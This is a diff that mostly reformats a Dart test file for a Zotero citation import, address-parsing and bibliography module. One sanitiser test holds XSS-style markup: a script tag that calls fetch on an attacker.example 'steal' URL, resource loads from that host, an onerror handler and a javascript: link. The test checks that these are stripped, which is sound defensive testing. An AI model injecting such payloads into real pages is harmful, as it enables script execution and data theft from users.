@@ -87,27 +87,32 @@ void main() {
       expect(records.every((item) => item.itemData!['id'] == item.id), isTrue);
     });
 
-    test('links explicit personal and group URIs without conflating identical keys', () {
-      final sources = [
-        {..._source(), 'uri': 'http://zotero.org/users/123/items/ABCD1234'},
-        {
-          ..._source(),
-          'uris': ['https://zotero.org/groups/123/items/ABCD1234'],
-        },
-      ];
-      final result = zoteroImportCslJson(jsonEncode(sources));
-      expect(result.first.uris, ['http://zotero.org/users/123/items/ABCD1234']);
-      expect(result.last.uris, [
-        'https://zotero.org/groups/123/items/ABCD1234',
-      ]);
-      expect(result.first.id, isNot(result.last.id));
-      final user = ZoteroSourceAddress.parse(result.first.uris.single)!;
-      final group = ZoteroSourceAddress.parse(result.last.uris.single)!;
-      expect(user.library.type, ZoteroLibraryType.user);
-      expect(group.library.type, ZoteroLibraryType.group);
-      expect(user.library.id, 123);
-      expect(group.key, 'ABCD1234');
-    });
+    test(
+      'links explicit personal and group URIs without conflating identical keys',
+      () {
+        final sources = [
+          {..._source(), 'uri': 'http://zotero.org/users/123/items/ABCD1234'},
+          {
+            ..._source(),
+            'uris': ['https://zotero.org/groups/123/items/ABCD1234'],
+          },
+        ];
+        final result = zoteroImportCslJson(jsonEncode(sources));
+        expect(result.first.uris, [
+          'http://zotero.org/users/123/items/ABCD1234',
+        ]);
+        expect(result.last.uris, [
+          'https://zotero.org/groups/123/items/ABCD1234',
+        ]);
+        expect(result.first.id, isNot(result.last.id));
+        final user = ZoteroSourceAddress.parse(result.first.uris.single)!;
+        final group = ZoteroSourceAddress.parse(result.last.uris.single)!;
+        expect(user.library.type, ZoteroLibraryType.user);
+        expect(group.library.type, ZoteroLibraryType.group);
+        expect(user.library.id, 123);
+        expect(group.key, 'ABCD1234');
+      },
+    );
 
     test('a canonical URI in the CSL id is a linked source', () {
       const uri = 'https://www.zotero.org/users/42/items/EFGH5678';
@@ -116,25 +121,28 @@ void main() {
       expect(item.itemData!['id'], uri);
     });
 
-    test('preserves unsynced identity separately from the desktop API route', () {
-      const uri = 'http://zotero.org/users/local/LOCALKEY/items/ABCD1234';
-      final item = zoteroImportCslJson(jsonEncode(_source(id: uri))).single;
-      expect(item.uris, [uri]);
-      expect(item.id, uri);
-      expect(item.itemData!['id'], uri);
-      expect(ZoteroSourceAddress.isLocalItemUri(uri), isTrue);
-      final address = ZoteroSourceAddress.parse(uri)!;
-      expect(address.library.isLocalUser, isTrue);
-      expect(address.library.apiPath, '/users/0');
-      expect(address.isLocal, isTrue);
-      expect(address.scope, '/users/local/LOCALKEY');
-      expect(address.canonicalUri.toString(), uri);
-      expect(
-        () => address.library.itemUri(address.key),
-        throwsStateError,
-        reason: 'The routing alias cannot become a citation identity.',
-      );
-    });
+    test(
+      'preserves unsynced identity separately from the desktop API route',
+      () {
+        const uri = 'http://zotero.org/users/local/LOCALKEY/items/ABCD1234';
+        final item = zoteroImportCslJson(jsonEncode(_source(id: uri))).single;
+        expect(item.uris, [uri]);
+        expect(item.id, uri);
+        expect(item.itemData!['id'], uri);
+        expect(ZoteroSourceAddress.isLocalItemUri(uri), isTrue);
+        final address = ZoteroSourceAddress.parse(uri)!;
+        expect(address.library.isLocalUser, isTrue);
+        expect(address.library.apiPath, '/users/0');
+        expect(address.isLocal, isTrue);
+        expect(address.scope, '/users/local/LOCALKEY');
+        expect(address.canonicalUri.toString(), uri);
+        expect(
+          () => address.library.itemUri(address.key),
+          throwsStateError,
+          reason: 'The routing alias cannot become a citation identity.',
+        );
+      },
+    );
 
     test('rejects local routing aliases and malformed desktop identities', () {
       for (final uri in [
@@ -255,34 +263,42 @@ void main() {
   });
 
   group('desktop source identity', () {
-    test('normalizes aliases without changing the original imported source', () {
-      const original =
-          'https://www.zotero.org/users/local/LocaL123/items/ABCD1234';
-      final source = zoteroImportCslJson(jsonEncode(_source(id: original))).single;
-      final address = ZoteroSourceAddress.parse(original)!;
-      expect(address.key, 'ABCD1234');
-      expect(address.scope, '/users/local/LocaL123');
-      expect(
-        address.canonicalUri.toString(),
-        'http://zotero.org/users/local/LocaL123/items/ABCD1234',
-      );
-      expect(source.id, original);
-      expect(source.uris, [original]);
-      expect(source.itemData!['id'], original);
-    });
+    test(
+      'normalizes aliases without changing the original imported source',
+      () {
+        const original =
+            'https://www.zotero.org/users/local/LocaL123/items/ABCD1234';
+        final source = zoteroImportCslJson(
+          jsonEncode(_source(id: original)),
+        ).single;
+        final address = ZoteroSourceAddress.parse(original)!;
+        expect(address.key, 'ABCD1234');
+        expect(address.scope, '/users/local/LocaL123');
+        expect(
+          address.canonicalUri.toString(),
+          'http://zotero.org/users/local/LocaL123/items/ABCD1234',
+        );
+        expect(source.id, original);
+        expect(source.uris, [original]);
+        expect(source.itemData!['id'], original);
+      },
+    );
 
-    test('same request route and item key do not conflate desktop profiles', () {
-      final first = ZoteroSourceAddress.parse(
-        'http://zotero.org/users/local/LOCALKEY/items/ABCD1234',
-      )!;
-      final second = ZoteroSourceAddress.parse(
-        'http://zotero.org/users/local/OTHERKEY/items/ABCD1234',
-      )!;
-      expect(first.library, second.library);
-      expect(first.key, second.key);
-      expect(first.scope, isNot(second.scope));
-      expect(first.canonicalUri, isNot(second.canonicalUri));
-    });
+    test(
+      'same request route and item key do not conflate desktop profiles',
+      () {
+        final first = ZoteroSourceAddress.parse(
+          'http://zotero.org/users/local/LOCALKEY/items/ABCD1234',
+        )!;
+        final second = ZoteroSourceAddress.parse(
+          'http://zotero.org/users/local/OTHERKEY/items/ABCD1234',
+        )!;
+        expect(first.library, second.library);
+        expect(first.key, second.key);
+        expect(first.scope, isNot(second.scope));
+        expect(first.canonicalUri, isNot(second.canonicalUri));
+      },
+    );
 
     test('local and numeric identities have distinct scopes', () {
       final local = ZoteroSourceAddress.parse(
@@ -298,36 +314,49 @@ void main() {
       expect(local.isLocal, isTrue);
       expect(account.isLocal, isFalse);
       expect(group.isLocal, isFalse);
-      expect(account.canonicalUri, Uri.parse(
-        'http://zotero.org/users/42/items/ABCD1234',
-      ));
+      expect(
+        account.canonicalUri,
+        Uri.parse('http://zotero.org/users/42/items/ABCD1234'),
+      );
     });
 
-    test('the source-compatible remote constructor retains canonical identity', () {
-      final address = ZoteroSourceAddress(ZoteroLibrary.group(42), 'ABCD1234');
-      expect(address.scope, '/groups/42');
-      expect(
-        address.canonicalUri.toString(),
-        'http://zotero.org/groups/42/items/ABCD1234',
-      );
-      final alias = ZoteroSourceAddress(ZoteroLibrary.localUser(), 'ABCD1234');
-      expect(() => alias.canonicalUri, throwsStateError);
-    });
+    test(
+      'the source-compatible remote constructor retains canonical identity',
+      () {
+        final address = ZoteroSourceAddress(
+          ZoteroLibrary.group(42),
+          'ABCD1234',
+        );
+        expect(address.scope, '/groups/42');
+        expect(
+          address.canonicalUri.toString(),
+          'http://zotero.org/groups/42/items/ABCD1234',
+        );
+        final alias = ZoteroSourceAddress(
+          ZoteroLibrary.localUser(),
+          'ABCD1234',
+        );
+        expect(() => alias.canonicalUri, throwsStateError);
+      },
+    );
   });
 
   group('formatted references become inert text', () {
-    test('removes scripts, styles and resource tags while preserving reference text', () {
-      final text = zoteroHtmlToPlainText(
-        '<style>body { background:url(https://attacker.example/image); }</style>'
-        '<ScRiPt>fetch("https://attacker.example/steal")</sCrIpT>'
-        '<div><img src="https://attacker.example/image" onerror="alert(1)">'
-        '<a href="javascript:alert(1)">A useful source</a></div>'
-        '<p>Second <i>reference</i><br />next line</p>',
-      );
-      expect(text, 'A useful source\nSecond reference\nnext line');
-      expect(text, isNot(contains('attacker.example')));
-      expect(text, isNot(contains('alert')));
-    });
+    test(
+      'removes scripts, styles and resource tags while preserving reference text',
+      () {
+        final text = zoteroHtmlToPlainText(
+          '<style>body { background:url(https://attacker.example/image); }</style>'
+          '<ScRiPt>fetch("https://attacker.example/steal")</sCrIpT>'
+          '<div><img src="https://attacker.example/image" onerror="alert(1)">'
+          '<a href="javascript:alert(1)">A useful source</a></div>'
+          '<p>Second <i>reference</i><br />next line</p>',
+        );
+        expect(text, 'A useful source\nSecond reference\nnext line');
+        expect(text, isNot(contains('attacker.example')));
+        expect(text, isNot(contains('alert')));
+      },
+    );
 
     test(
       'decodes named and numeric entities and preserves multilingual text',
@@ -418,25 +447,28 @@ void main() {
       );
     });
 
-    test('corporate authors, missing authors and missing dates have readable fallbacks', () {
-      final corporate = ZoteroCitationItem.fromJson({
-        'id': 'corporate',
-        'itemData': {
-          'type': 'report',
-          'title': 'A report',
-          'author': [
-            {'literal': 'Research Council'},
-          ],
-          'issued': {'literal': 'Spring 2022'},
-        },
-      });
-      final anonymous = ZoteroCitationItem.fromJson({
-        'id': 'anonymous',
-        'itemData': {'type': 'book', 'title': '<i>Anonymous work</i>'},
-      });
-      expect(zoteroBasicCitation([corporate]), '(Research Council, 2022)');
-      expect(zoteroBasicCitation([anonymous]), '(Anonymous work, n.d.)');
-    });
+    test(
+      'corporate authors, missing authors and missing dates have readable fallbacks',
+      () {
+        final corporate = ZoteroCitationItem.fromJson({
+          'id': 'corporate',
+          'itemData': {
+            'type': 'report',
+            'title': 'A report',
+            'author': [
+              {'literal': 'Research Council'},
+            ],
+            'issued': {'literal': 'Spring 2022'},
+          },
+        });
+        final anonymous = ZoteroCitationItem.fromJson({
+          'id': 'anonymous',
+          'itemData': {'type': 'book', 'title': '<i>Anonymous work</i>'},
+        });
+        expect(zoteroBasicCitation([corporate]), '(Research Council, 2022)');
+        expect(zoteroBasicCitation([anonymous]), '(Anonymous work, n.d.)');
+      },
+    );
   });
 
   group('basic bibliography fallback', () {
@@ -500,46 +532,52 @@ void main() {
       expect(zoteroBasicBibliography(sources).split('\n\n'), hasLength(1));
     });
 
-    test('local URI aliases dedupe while identical keys in other profiles do not', () {
-      final sources = [
-        _citation(
-          id: 'first',
-          uri: 'http://zotero.org/users/local/LOCALKEY/items/ABCD1234',
-          title: 'First profile',
-        ),
-        _citation(
-          id: 'alias',
-          uri: 'https://www.zotero.org/users/local/LOCALKEY/items/ABCD1234',
-          title: 'Duplicate alias',
-        ),
-        _citation(
-          id: 'other',
-          uri: 'https://zotero.org/users/local/OTHERKEY/items/ABCD1234',
-          title: 'Other profile',
-        ),
-      ];
-      final text = zoteroBasicBibliography(sources);
-      expect(text.split('\n\n'), hasLength(2));
-      expect(text, contains('First profile'));
-      expect(text, contains('Other profile'));
-      expect(text, isNot(contains('Duplicate alias')));
-    });
+    test(
+      'local URI aliases dedupe while identical keys in other profiles do not',
+      () {
+        final sources = [
+          _citation(
+            id: 'first',
+            uri: 'http://zotero.org/users/local/LOCALKEY/items/ABCD1234',
+            title: 'First profile',
+          ),
+          _citation(
+            id: 'alias',
+            uri: 'https://www.zotero.org/users/local/LOCALKEY/items/ABCD1234',
+            title: 'Duplicate alias',
+          ),
+          _citation(
+            id: 'other',
+            uri: 'https://zotero.org/users/local/OTHERKEY/items/ABCD1234',
+            title: 'Other profile',
+          ),
+        ];
+        final text = zoteroBasicBibliography(sources);
+        expect(text.split('\n\n'), hasLength(2));
+        expect(text, contains('First profile'));
+        expect(text, contains('Other profile'));
+        expect(text, isNot(contains('Duplicate alias')));
+      },
+    );
 
-    test('keeps container/DOI data, strips title markup and skips missing snapshots', () {
-      final source = ZoteroCitationItem.fromJson({
-        'id': 'enriched',
-        'itemData': {
-          ..._source(title: '<i>A</i> &amp; <b>B</b>'),
-          'container-title': 'Journal of Examples',
-          'DOI': '10.1234/example',
-        },
-      });
-      final missing = ZoteroCitationItem.fromJson({'id': 'no-data'});
-      final text = zoteroBasicBibliography([missing, source]);
-      expect(
-        text,
-        'Hassan, Amal (2024). A & B. Journal of Examples. https://doi.org/10.1234/example',
-      );
-    });
+    test(
+      'keeps container/DOI data, strips title markup and skips missing snapshots',
+      () {
+        final source = ZoteroCitationItem.fromJson({
+          'id': 'enriched',
+          'itemData': {
+            ..._source(title: '<i>A</i> &amp; <b>B</b>'),
+            'container-title': 'Journal of Examples',
+            'DOI': '10.1234/example',
+          },
+        });
+        final missing = ZoteroCitationItem.fromJson({'id': 'no-data'});
+        final text = zoteroBasicBibliography([missing, source]);
+        expect(
+          text,
+          'Hassan, Amal (2024). A & B. Journal of Examples. https://doi.org/10.1234/example',
+        );
+      },
+    );
   });
 }
